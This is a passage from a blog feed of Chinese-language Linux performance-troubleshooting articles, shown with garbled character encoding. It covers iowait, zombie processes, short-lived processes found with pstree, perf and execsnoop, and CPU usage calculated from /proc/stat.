title="æ€»ç»“"></a>æ€»ç»“</h2><p>è™½ç„¶è¿™ä¸ªæ¡ˆä¾‹æ˜¯ç£ç›˜ I/O å¯¼è‡´äº† iowait å‡é«˜ï¼Œä¸è¿‡ï¼Œ <strong>iowait é«˜ä¸ä¸€å®šä»£è¡¨ I/O æœ‰æ€§èƒ½ç“¶é¢ˆã€‚å½“ç³»ç»Ÿä¸­åªæœ‰ I/O ç±»å‹çš„è¿›ç¨‹åœ¨è¿è¡Œæ—¶ï¼Œiowait ä¹Ÿä¼šå¾ˆé«˜ï¼Œä½†å®é™…ä¸Šï¼Œç£ç›˜çš„è¯»å†™è¿œæ²¡æœ‰è¾¾åˆ°æ€§èƒ½ç“¶é¢ˆçš„ç¨‹åº¦</strong>ã€‚<br>å› æ­¤ï¼Œç¢°åˆ° iowait å‡é«˜æ—¶ï¼Œéœ€è¦å…ˆç”¨ dstatã€pidstat ç­‰å·¥å…·ï¼Œç¡®è®¤æ˜¯ä¸æ˜¯ç£ç›˜ I/O çš„é—®é¢˜ï¼Œç„¶åå†æ‰¾æ˜¯å“ªäº›è¿›ç¨‹å¯¼è‡´äº† I/Oå‡é«˜ã€‚<br>ç­‰å¾… I/O çš„è¿›ç¨‹ä¸€èˆ¬æ˜¯ä¸å¯ä¸­æ–­çŠ¶æ€ï¼Œæ‰€ä»¥ç”¨ ps å‘½ä»¤æ‰¾åˆ°çš„ D çŠ¶æ€ï¼ˆå³ä¸å¯ä¸­æ–­çŠ¶æ€ï¼‰çš„è¿›ç¨‹ï¼Œå¤šä¸ºå¯ç–‘è¿›ç¨‹ã€‚ä½†è¿™ä¸ªæ¡ˆä¾‹ä¸­ï¼Œåœ¨ I/O æ“ä½œåï¼Œè¿›ç¨‹åˆå˜æˆäº†åƒµå°¸è¿›ç¨‹ï¼Œæ‰€ä»¥ä¸èƒ½ç”¨ strace ç›´æ¥åˆ†æè¿™ä¸ªè¿›ç¨‹çš„ç³»ç»Ÿè°ƒç”¨ã€‚<br>è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ç”¨äº† perf å·¥å…·ï¼Œæ¥åˆ†æç³»ç»Ÿçš„ CPU æ—¶é’Ÿäº‹ä»¶ï¼Œæœ€ç»ˆå‘ç°æ˜¯ç›´æ¥ I/O å¯¼è‡´çš„é—®é¢˜ã€‚è¿™æ—¶ï¼Œå†æ£€æŸ¥æºç ä¸­å¯¹åº”ä½ç½®çš„é—®é¢˜ï¼Œå°±å¾ˆè½»æ¾äº†ã€‚<br>è€Œåƒµå°¸è¿›ç¨‹çš„é—®é¢˜ç›¸å¯¹å®¹æ˜“æ’æŸ¥ï¼Œä½¿ç”¨ pstree æ‰¾å‡ºçˆ¶è¿›ç¨‹åï¼Œå»æŸ¥çœ‹çˆ¶è¿›ç¨‹çš„ä»£ç ï¼Œæ£€æŸ¥ wait() / waitpid() çš„è°ƒç”¨ï¼Œæˆ–æ˜¯ SIGCHLD ä¿¡å·å¤„ç†å‡½æ•°çš„æ³¨å†Œå°±è¡Œäº†ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> é—®é¢˜å’ŒæŠ€å·§ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç³»ç»Ÿçš„_CPU_ä½¿ç”¨ç‡å¾ˆé«˜ï¼Œä½†ä¸ºå•¥å´æ‰¾ä¸åˆ°é«˜_CPU_çš„åº”ç”¨ï¼Ÿ</title>
      <link href="/2022/06/23/%E7%B3%BB%E7%BB%9F%E7%9A%84_CPU_%E4%BD%BF%E7%94%A8%E7%8E%87%E5%BE%88%E9%AB%98%EF%BC%8C%E4%BD%86%E4%B8%BA%E5%95%A5%E5%8D%B4%E6%89%BE%E4%B8%8D%E5%88%B0%E9%AB%98_CPU_%E7%9A%84%E5%BA%94%E7%94%A8%EF%BC%9F/"/>
      <url>/2022/06/23/%E7%B3%BB%E7%BB%9F%E7%9A%84_CPU_%E4%BD%BF%E7%94%A8%E7%8E%87%E5%BE%88%E9%AB%98%EF%BC%8C%E4%BD%86%E4%B8%BA%E5%95%A5%E5%8D%B4%E6%89%BE%E4%B8%8D%E5%88%B0%E9%AB%98_CPU_%E7%9A%84%E5%BA%94%E7%94%A8%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<h2 id="æ¦‚å¿µ"><a href="#æ¦‚å¿µ" class="headerlink" title="æ¦‚å¿µ"></a>æ¦‚å¿µ</h2><p>ç³»ç»Ÿçš„ CPU ä½¿ç”¨ç‡ï¼Œä¸ä»…åŒ…æ‹¬è¿›ç¨‹ç”¨æˆ·æ€å’Œå†…æ ¸æ€çš„è¿è¡Œï¼Œè¿˜åŒ…æ‹¬ä¸­æ–­å¤„ç†ã€ç­‰å¾… I/O ä»¥åŠå†…æ ¸çº¿ç¨‹ç­‰ã€‚æ‰€ä»¥ï¼Œå½“ä½ å‘ç°ç³»ç»Ÿçš„ CPU ä½¿ç”¨ç‡å¾ˆé«˜çš„æ—¶å€™ï¼Œä¸ä¸€å®šèƒ½æ‰¾åˆ°ç›¸å¯¹åº”çš„é«˜ CPU ä½¿ç”¨ç‡çš„è¿›ç¨‹ã€‚</p><h2 id="è¿‡ç¨‹"><a href="#è¿‡ç¨‹" class="headerlink" title="è¿‡ç¨‹"></a>è¿‡ç¨‹</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pidstat -p <span class="number">24344</span></span><br></pre></td></tr></table></figure><p>æ— è¾“å‡ºï¼ŒåŸæ¥æ˜¯è¿›ç¨‹çš„ PID åœ¨å˜ï¼Œè¿™è¯´æ˜ä»€ä¹ˆè¦ä¹ˆæ˜¯è¿™äº›è¿›ç¨‹åœ¨ä¸åœåœ°é‡å¯ï¼Œè¦ä¹ˆå°±æ˜¯å…¨æ–°çš„è¿›ç¨‹ï¼Œè¿™æ— éä¹Ÿå°±ä¸¤ä¸ªåŸå› ï¼š</p><ul><li>ç¬¬ä¸€ä¸ªåŸå› ï¼Œè¿›ç¨‹åœ¨ä¸åœåœ°å´©æºƒé‡å¯ï¼Œæ¯”å¦‚å› ä¸ºæ®µé”™è¯¯ã€é…ç½®é”™è¯¯ç­‰ç­‰ï¼Œè¿™æ—¶ï¼Œè¿›ç¨‹åœ¨é€€å‡ºåå¯èƒ½åˆè¢«ç›‘æ§ç³»ç»Ÿè‡ªåŠ¨é‡å¯äº†ã€‚</li><li>ç¬¬äºŒä¸ªåŸå› ï¼Œè¿™äº›è¿›ç¨‹éƒ½æ˜¯çŸ­æ—¶è¿›ç¨‹ï¼Œä¹Ÿå°±æ˜¯åœ¨å…¶ä»–åº”ç”¨å†…éƒ¨é€šè¿‡ exec è°ƒç”¨çš„å¤–é¢å‘½ä»¤ã€‚è¿™äº›å‘½ä»¤ä¸€èˆ¬éƒ½åªè¿è¡Œå¾ˆçŸ­çš„æ—¶é—´å°±ä¼šç»“æŸï¼Œä½ å¾ˆéš¾ç”¨ top è¿™ç§é—´éš”æ—¶é—´æ¯”è¾ƒé•¿çš„å·¥å…·å‘ç°ï¼ˆä¸Šé¢çš„æ¡ˆä¾‹ï¼Œæˆ‘ä»¬ç¢°å·§å‘ç°äº†ï¼‰ã€‚<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#ç”¨ pstree å°±å¯ä»¥ç”¨æ ‘çŠ¶å½¢å¼æ˜¾ç¤ºæ‰€æœ‰è¿›ç¨‹ä¹‹é—´çš„å…³ç³»ï¼š</span><br><span class="line">$ pstree | grep stress</span><br><span class="line">        |-docker-containe-+-php-fpm-+-php-fpm---sh---stress</span><br><span class="line">        |         |<span class="number">-3</span>*[php-fpm---sh---stress---stress]</span><br><span class="line"></span><br></pre></td></tr></table></figure>ä»è¿™é‡Œå¯ä»¥çœ‹åˆ°ï¼Œstress æ˜¯è¢« php-fpm è°ƒç”¨çš„å­è¿›ç¨‹ï¼Œå¹¶ä¸”è¿›ç¨‹æ•°é‡ä¸æ­¢ä¸€ä¸ªï¼ˆè¿™é‡Œæ˜¯ 3 ä¸ªï¼‰ã€‚æ‰¾åˆ°çˆ¶è¿›ç¨‹åï¼Œæˆ‘ä»¬èƒ½è¿›å…¥ app çš„å†…éƒ¨åˆ†æäº†ã€‚<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># æ‹·è´æºç åˆ°æœ¬åœ°</span><br><span class="line">$ docker cp phpfpm:/app .</span><br><span class="line"> </span><br><span class="line"># grep æŸ¥æ‰¾çœ‹çœ‹æ˜¯ä¸æ˜¯æœ‰ä»£ç åœ¨è°ƒç”¨ stress å‘½ä»¤</span><br><span class="line">$ grep stress -r app</span><br><span class="line">app/index.php:<span class="comment">// fake I/O with stress (via write()/unlink()).</span></span><br><span class="line">app/index.php:$result = exec(<span class="string">&quot;/usr/local/bin/stress -t 1 -d 1 2&gt;&amp;1&quot;</span>, $output, $status);</span><br><span class="line"></span><br></pre></td></tr></table></figure>æ‰¾åˆ°äº†ï¼Œæœç„¶æ˜¯ app/index.php æ–‡ä»¶ä¸­ç›´æ¥è°ƒç”¨äº† stress å‘½ä»¤ã€‚<br>å†æ¥çœ‹çœ‹<a href="https://github.com/feiskyer/linux-perf-examples/blob/master/nginx-short-process/app/index.php">app/index.php</a>çš„æºä»£ç ï¼š<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ cat app/index.php</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="comment">// fake I/O with stress (via write()/unlink()).</span></span><br><span class="line">$result = exec(<span class="string">&quot;/usr/local/bin/stress -t 1 -d 1 2&gt;&amp;1&quot;</span>, $output, $status);</span><br><span class="line"><span class="keyword">if</span> (isset($_GET[<span class="string">&quot;verbose&quot;</span>]) &amp;&amp; $_GET[<span class="string">&quot;verbose&quot;</span>]==<span class="number">1</span> &amp;&amp; $status != <span class="number">0</span>) &#123;</span><br><span class="line">  echo <span class="string">&quot;Server internal error: &quot;</span>;</span><br><span class="line">  print_r($output);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  echo <span class="string">&quot;It works!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>å¯ä»¥çœ‹åˆ°ï¼Œæºç é‡Œå¯¹æ¯ä¸ªè¯·æ±‚éƒ½ä¼šè°ƒç”¨ä¸€ä¸ª stress å‘½ä»¤ï¼Œæ¨¡æ‹Ÿ I/O å‹åŠ›ã€‚ä»æ³¨é‡Šä¸Šçœ‹ï¼Œstress ä¼šé€šè¿‡ write() å’Œ unlink() å¯¹ I/O è¿›ç¨‹è¿›è¡Œå‹æµ‹ï¼Œçœ‹æ¥ï¼Œè¿™åº”è¯¥å°±æ˜¯ç³»ç»Ÿ CPU ä½¿ç”¨ç‡å‡é«˜çš„æ ¹æºäº†ã€‚<br>ä¸è¿‡ï¼Œstress æ¨¡æ‹Ÿçš„æ˜¯ I/O å‹åŠ›ï¼Œè€Œä¹‹å‰åœ¨ top çš„è¾“å‡ºä¸­çœ‹åˆ°çš„ï¼Œå´ä¸€ç›´æ˜¯ç”¨æˆ· CPU å’Œç³»ç»Ÿ CPU å‡é«˜ï¼Œå¹¶æ²¡è§åˆ° iowait å‡é«˜ã€‚è¿™åˆæ˜¯æ€ä¹ˆå›äº‹å‘¢ï¼Ÿstress åˆ°åº•æ˜¯ä¸æ˜¯ CPU ä½¿ç”¨ç‡å‡é«˜çš„åŸå› å‘¢ï¼Ÿ<br>æˆ‘ä»¬è¿˜å¾—ç»§ç»­å¾€ä¸‹èµ°ã€‚ä»ä»£ç ä¸­å¯ä»¥çœ‹åˆ°ï¼Œç»™è¯·æ±‚åŠ å…¥ verbose=1 å‚æ•°åï¼Œå°±å¯ä»¥æŸ¥çœ‹ stress çš„è¾“å‡ºã€‚ä½ å…ˆè¯•è¯•çœ‹ï¼Œåœ¨ç¬¬äºŒä¸ªç»ˆç«¯è¿è¡Œï¼š<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ curl http:<span class="comment">//192.168.0.10:10000?verbose=1</span></span><br><span class="line">Server internal error: Array</span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; stress: info: [<span class="number">19607</span>] dispatching hogs: <span class="number">0</span> cpu, <span class="number">0</span> io, <span class="number">0</span> vm, <span class="number">1</span> hdd</span><br><span class="line">    [<span class="number">1</span>] =&gt; stress: FAIL: [<span class="number">19608</span>] (<span class="number">563</span>) mkstemp failed: Permission denied</span><br><span class="line">    [<span class="number">2</span>] =&gt; stress: FAIL: [<span class="number">19607</span>] (<span class="number">394</span>) &lt;-- worker <span class="number">19608</span> returned error <span class="number">1</span></span><br><span class="line">    [<span class="number">3</span>] =&gt; stress: WARN: [<span class="number">19607</span>] (<span class="number">396</span>) now reaping child worker processes</span><br><span class="line">    [<span class="number">4</span>] =&gt; stress: FAIL: [<span class="number">19607</span>] (<span class="number">400</span>) kill error: No such process</span><br><span class="line">    [<span class="number">5</span>] =&gt; stress: FAIL: [<span class="number">19607</span>] (<span class="number">451</span>) failed run completed in <span class="number">0</span>s</span><br><span class="line">)</span><br></pre></td></tr></table></figure>çœ‹é”™è¯¯æ¶ˆæ¯ mkstemp failed: Permission denied ï¼Œä»¥åŠ failed run completed in 0sã€‚åŸæ¥ stress å‘½ä»¤å¹¶æ²¡æœ‰æˆåŠŸï¼Œå®ƒå› ä¸ºæƒé™é—®é¢˜å¤±è´¥é€€å‡ºäº†ã€‚çœ‹æ¥ï¼Œæˆ‘ä»¬å‘ç°äº†ä¸€ä¸ª PHP è°ƒç”¨å¤–éƒ¨ stress å‘½ä»¤çš„ bugï¼šæ²¡æœ‰æƒé™åˆ›å»ºä¸´æ—¶æ–‡ä»¶ã€‚<br>ä»è¿™é‡Œæˆ‘ä»¬å¯ä»¥çŒœæµ‹ï¼Œæ­£æ˜¯ç”±äºæƒé™é”™è¯¯ï¼Œå¤§é‡çš„ stress è¿›ç¨‹åœ¨å¯åŠ¨æ—¶åˆå§‹åŒ–å¤±è´¥ï¼Œè¿›è€Œå¯¼è‡´ç”¨æˆ· CPU ä½¿ç”¨ç‡çš„å‡é«˜ã€‚<br>åˆ†æå‡ºé—®é¢˜æ¥æºï¼Œä¸‹ä¸€æ­¥æ˜¯ä¸æ˜¯å°±è¦å¼€å§‹ä¼˜åŒ–äº†å‘¢ï¼Ÿå½“ç„¶ä¸æ˜¯ï¼æ—¢ç„¶åªæ˜¯çŒœæµ‹ï¼Œé‚£å°±éœ€è¦å†ç¡®è®¤ä¸€ä¸‹ï¼Œè¿™ä¸ªçŒœæµ‹åˆ°åº•å¯¹ä¸å¯¹ï¼Œæ˜¯ä¸æ˜¯çœŸçš„æœ‰å¤§é‡çš„ stress è¿›ç¨‹ã€‚è¯¥ç”¨ä»€ä¹ˆå·¥å…·æˆ–æŒ‡æ ‡å‘¢ï¼Ÿ<br>æˆ‘ä»¬å‰é¢å·²ç»ç”¨äº† topã€pidstatã€pstree ç­‰å·¥å…·ï¼Œæ²¡æœ‰å‘ç°å¤§é‡çš„ stress è¿›ç¨‹ã€‚æ‰€ä»¥ç»§ç»­ç”¨perfåˆ†æã€‚<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># è®°å½•æ€§èƒ½äº‹ä»¶ï¼Œç­‰å¾…å¤§çº¦<span class="number">15</span>ç§’åæŒ‰ Ctrl+C é€€å‡º</span><br><span class="line">$ perf record -g</span><br><span class="line"></span><br><span class="line"># æŸ¥çœ‹æŠ¥å‘Š</span><br><span class="line">$ perf report</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="execsnoop"><a href="#execsnoop" class="headerlink" title="execsnoop"></a>execsnoop</h2>åœ¨è¿™ä¸ªæ¡ˆä¾‹ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨äº† topã€pidstatã€pstree ç­‰å·¥å…·åˆ†æäº†ç³»ç»Ÿ CPU ä½¿ç”¨ç‡é«˜çš„é—®é¢˜ï¼Œå¹¶å‘ç° CPU å‡é«˜æ˜¯çŸ­æ—¶è¿›ç¨‹ stress å¯¼è‡´çš„ï¼Œä½†æ˜¯æ•´ä¸ªåˆ†æè¿‡ç¨‹è¿˜æ˜¯æ¯”è¾ƒå¤æ‚çš„ã€‚å¯¹äºè¿™ç±»é—®é¢˜ï¼Œæœ‰æ²¡æœ‰æ›´å¥½çš„æ–¹æ³•ç›‘æ§å‘¢ï¼Ÿ<br><a href="https://github.com/brendangregg/perf-tools/blob/master/execsnoop">execsnoop</a> å°±æ˜¯ä¸€ä¸ªä¸“ä¸ºçŸ­æ—¶è¿›ç¨‹è®¾è®¡çš„å·¥å…·ã€‚å®ƒé€šè¿‡ ftrace å®æ—¶ç›‘æ§è¿›ç¨‹çš„ exec() è¡Œä¸ºï¼Œå¹¶è¾“å‡ºçŸ­æ—¶è¿›ç¨‹çš„åŸºæœ¬ä¿¡æ¯ï¼ŒåŒ…æ‹¬è¿›ç¨‹ PIDã€çˆ¶è¿›ç¨‹ PIDã€å‘½ä»¤è¡Œå‚æ•°ä»¥åŠæ‰§è¡Œçš„ç»“æœã€‚<br>æ¯”å¦‚ï¼Œç”¨ execsnoop ç›‘æ§ä¸Šè¿°æ¡ˆä¾‹ï¼Œå°±å¯ä»¥ç›´æ¥å¾—åˆ° stress è¿›ç¨‹çš„çˆ¶è¿›ç¨‹ PID ä»¥åŠå®ƒçš„å‘½ä»¤è¡Œå‚æ•°ï¼Œå¹¶å¯ä»¥å‘ç°å¤§é‡çš„ stress è¿›ç¨‹åœ¨ä¸åœå¯åŠ¨ï¼š<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># æŒ‰ Ctrl+C ç»“æŸ</span><br><span class="line">$ execsnoop</span><br><span class="line">PCOMM            PID    PPID   RET ARGS</span><br><span class="line">sh               <span class="number">30394</span>  <span class="number">30393</span>    <span class="number">0</span></span><br><span class="line">stress           <span class="number">30396</span>  <span class="number">30394</span>    <span class="number">0</span> /usr/local/bin/stress -t <span class="number">1</span> -d <span class="number">1</span></span><br><span class="line">sh               <span class="number">30398</span>  <span class="number">30393</span>    <span class="number">0</span></span><br><span class="line">stress           <span class="number">30399</span>  <span class="number">30398</span>    <span class="number">0</span> /usr/local/bin/stress -t <span class="number">1</span> -d <span class="number">1</span></span><br><span class="line">sh               <span class="number">30402</span>  <span class="number">30400</span>    <span class="number">0</span></span><br><span class="line">stress           <span class="number">30403</span>  <span class="number">30402</span>    <span class="number">0</span> /usr/local/bin/stress -t <span class="number">1</span> -d <span class="number">1</span></span><br><span class="line">sh               <span class="number">30405</span>  <span class="number">30393</span>    <span class="number">0</span></span><br><span class="line">stress           <span class="number">30407</span>  <span class="number">30405</span>    <span class="number">0</span> /usr/local/bin/stress -t <span class="number">1</span> -d <span class="number">1</span></span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>execsnoop æ‰€ç”¨çš„ ftrace æ˜¯ä¸€ç§å¸¸ç”¨çš„åŠ¨æ€è¿½è¸ªæŠ€æœ¯ï¼Œä¸€èˆ¬ç”¨äºåˆ†æ Linux å†…æ ¸çš„è¿è¡Œæ—¶è¡Œä¸ºã€‚<h2 id="ç»“è®º"><a href="#ç»“è®º" class="headerlink" title="ç»“è®º"></a>ç»“è®º</h2>ç¢°åˆ°å¸¸è§„é—®é¢˜æ— æ³•è§£é‡Šçš„ CPU ä½¿ç”¨ç‡æƒ…å†µæ—¶ï¼Œé¦–å…ˆè¦æƒ³åˆ°æœ‰å¯èƒ½æ˜¯çŸ­æ—¶åº”ç”¨å¯¼è‡´çš„é—®é¢˜ï¼Œæ¯”å¦‚æœ‰å¯èƒ½æ˜¯ä¸‹é¢è¿™ä¸¤ç§æƒ…å†µã€‚</li></ul><ol><li>åº”ç”¨é‡Œç›´æ¥è°ƒç”¨äº†å…¶ä»–äºŒè¿›åˆ¶ç¨‹åºï¼Œè¿™äº›ç¨‹åºé€šå¸¸è¿è¡Œæ—¶é—´æ¯”è¾ƒçŸ­ï¼Œé€šè¿‡ top ç­‰å·¥å…·ä¹Ÿä¸å®¹æ˜“å‘ç°ã€‚</li><li>åº”ç”¨æœ¬èº«åœ¨ä¸åœåœ°å´©æºƒé‡å¯ï¼Œè€Œå¯åŠ¨è¿‡ç¨‹çš„èµ„æºåˆå§‹åŒ–ï¼Œå¾ˆå¯èƒ½ä¼šå ç”¨ç›¸å½“å¤šçš„ CPUã€‚</li></ol>]]></content>
      
      
      <categories>
          
          <category> é—®é¢˜å’ŒæŠ€å·§ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CPUä½¿ç”¨ç‡ä»¥åŠå¼‚å¸¸æ’æŸ¥ç­–ç•¥</title>
      <link href="/2022/06/22/CPU%E4%BD%BF%E7%94%A8%E7%8E%87%E4%BB%A5%E5%8F%8A%E5%BC%82%E5%B8%B8%E6%8E%92%E6%9F%A5%E7%AD%96%E7%95%A5/"/>
      <url>/2022/06/22/CPU%E4%BD%BF%E7%94%A8%E7%8E%87%E4%BB%A5%E5%8F%8A%E5%BC%82%E5%B8%B8%E6%8E%92%E6%9F%A5%E7%AD%96%E7%95%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="CPUå’Œä»»åŠ¡ç»Ÿè®¡ä¿¡æ¯"><a href="#CPUå’Œä»»åŠ¡ç»Ÿè®¡ä¿¡æ¯" class="headerlink" title="CPUå’Œä»»åŠ¡ç»Ÿè®¡ä¿¡æ¯"></a>CPUå’Œä»»åŠ¡ç»Ÿè®¡ä¿¡æ¯</h2><p>ä¸ºäº†ç»´æŠ¤ CPU æ—¶é—´ï¼ŒLinux é€šè¿‡äº‹å…ˆå®šä¹‰çš„èŠ‚æ‹ç‡ï¼ˆå†…æ ¸ä¸­è¡¨ç¤ºä¸º HZï¼‰ï¼Œè§¦å‘æ—¶é—´ä¸­æ–­ï¼Œå¹¶ä½¿ç”¨å…¨å±€å˜é‡ Jiffies è®°å½•äº†å¼€æœºä»¥æ¥çš„èŠ‚æ‹æ•°ã€‚æ¯å‘ç”Ÿä¸€æ¬¡æ—¶é—´ä¸­æ–­ï¼ŒJiffies çš„å€¼å°±åŠ  1ã€‚<br>èŠ‚æ‹ç‡ HZ æ˜¯å†…æ ¸çš„å¯é…é€‰é¡¹ï¼Œå¯ä»¥è®¾ç½®ä¸º 100ã€250ã€1000 ç­‰ã€‚ä¸åŒçš„ç³»ç»Ÿå¯èƒ½è®¾ç½®ä¸åŒæ•°å€¼ï¼Œä½ å¯ä»¥é€šè¿‡æŸ¥è¯¢ /boot/config å†…æ ¸é€‰é¡¹æ¥æŸ¥çœ‹å®ƒçš„é…ç½®å€¼ã€‚<br>ä¸ºäº†æ–¹ä¾¿ç”¨æˆ·ç©ºé—´ç¨‹åºï¼Œå†…æ ¸è¿˜æä¾›äº†ä¸€ä¸ªç”¨æˆ·ç©ºé—´èŠ‚æ‹ç‡ USER_HZï¼Œå®ƒæ€»æ˜¯å›ºå®šä¸º 100ï¼Œä¹Ÿå°±æ˜¯ 1/100 ç§’ã€‚</p><ul><li><p>æŸ¥è¯¢/proc/stat</p><ul><li>ç¬¬ä¸€è¡Œè¡¨ç¤ºæ‰€æœ‰CPUçš„ç´¯åŠ </li><li>å…¶ä»–åˆ—è¡¨ç¤ºä¸åŒåœºæ™¯ä¸‹CPUçš„ç´¯åŠ èŠ‚æ‹æ•°ï¼Œå•ä½:USER_HZå³10ms<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">âœ  ~ cat /proc/stat|grep ^cpu</span><br><span class="line">cpu  <span class="number">135307</span> <span class="number">6855</span> <span class="number">165552</span> <span class="number">1632799</span> <span class="number">2751</span> <span class="number">0</span> <span class="number">723</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line">cpu0 <span class="number">16158</span> <span class="number">843</span> <span class="number">20907</span> <span class="number">1406454</span> <span class="number">2371</span> <span class="number">0</span> <span class="number">533</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line">cpu1 <span class="number">16261</span> <span class="number">673</span> <span class="number">21406</span> <span class="number">32408</span> <span class="number">68</span> <span class="number">0</span> <span class="number">117</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line">cpu2 <span class="number">17232</span> <span class="number">888</span> <span class="number">20364</span> <span class="number">32294</span> <span class="number">52</span> <span class="number">0</span> <span class="number">41</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line">cpu3 <span class="number">16700</span> <span class="number">988</span> <span class="number">20565</span> <span class="number">32273</span> <span class="number">38</span> <span class="number">0</span> <span class="number">8</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line">cpu4 <span class="number">17055</span> <span class="number">1003</span> <span class="number">20636</span> <span class="number">32286</span> <span class="number">39</span> <span class="number">0</span> <span class="number">10</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> </span><br><span class="line">cpu5 <span class="number">16702</span> <span class="number">832</span> <span class="number">20515</span> <span class="number">32345</span> <span class="number">54</span> <span class="number">0</span> <span class="number">5</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line">cpu6 <span class="number">17635</span> <span class="number">843</span> <span class="number">20566</span> <span class="number">32349</span> <span class="number">55</span> <span class="number">0</span> <span class="number">3</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line">cpu7 <span class="number">17561</span> <span class="number">782</span> <span class="number">20590</span> <span class="number">32388</span> <span class="number">71</span> <span class="number">0</span> <span class="number">3</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br></pre></td></tr></table></figure></li></ul></li></ul><p>èŠ‚æ‹æ•°çš„å’Œåæ˜ äº†cpuçš„ä½¿ç”¨æ—¶é—´ã€‚<br>è€Œæˆ‘ä»¬é€šå¸¸æ‰€è¯´çš„ <strong>CPU ä½¿ç”¨ç‡ï¼Œå°±æ˜¯é™¤äº†ç©ºé—²æ—¶é—´å¤–çš„å…¶ä»–æ—¶é—´å æ€» CPU æ—¶é—´çš„ç™¾åˆ†æ¯”</strong>ï¼Œç”¨å…¬å¼æ¥è¡¨ç¤ºå°±æ˜¯ï¼š<br><img src="https://snowgo.top/medias/medias/CPU%E4%BD%BF%E7%94%A8%E7%8E%87%E4%BB%A5%E5%8F%8A%E5%BC%82%E5%B8%B8%E6%8E%92%E6%9F%A5%E7%AD%96%E7%95%A5/0.png"><br>æ ¹æ®è¿™ä¸ªå…¬å¼ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä» /proc/stat ä¸­çš„æ•°æ®ï¼Œå¾ˆå®¹æ˜“åœ°è®¡ç®—å‡º CPU ä½¿ç”¨ç‡ã€‚å½“ç„¶ï¼Œä¹Ÿå¯ä»¥ç”¨æ¯ä¸€ä¸ªåœºæ™¯çš„ CPU æ—¶é—´ï¼Œé™¤ä»¥æ€»çš„ CPU æ—¶é—´ï¼Œè®¡ç®—å‡ºæ¯ä¸ªåœºæ™¯çš„ CPU ä½¿ç”¨ç‡ã€‚<br>ä¸è¿‡å…ˆä¸è¦ç€æ€¥è®¡ç®—ï¼Œä½ èƒ½è¯´å‡ºï¼Œç›´æ¥ç”¨ /proc/stat çš„æ•°æ®ï¼Œç®—çš„æ˜¯ä»€ä¹ˆæ—¶é—´æ®µçš„ CPU ä½¿ç”¨ç‡å—ï¼Ÿ<br>çœ‹åˆ°è¿™é‡Œï¼Œä½ åº”è¯¥æƒ³èµ·æ¥äº†ï¼Œè¿™æ˜¯å¼€æœºä»¥æ¥çš„èŠ‚æ‹æ•°ç´¯åŠ å€¼ï¼Œæ‰€ä»¥ç›´æ¥ç®—å‡ºæ¥çš„ï¼Œæ˜¯å¼€æœºä»¥æ¥çš„å¹³å‡ CPU ä½¿ç”¨ç‡ï¼Œä¸€èˆ¬æ²¡å•¥å‚è€ƒä»·å€¼ã€‚<br>äº‹å®ä¸Šï¼Œä¸ºäº†è®¡ç®— CPU 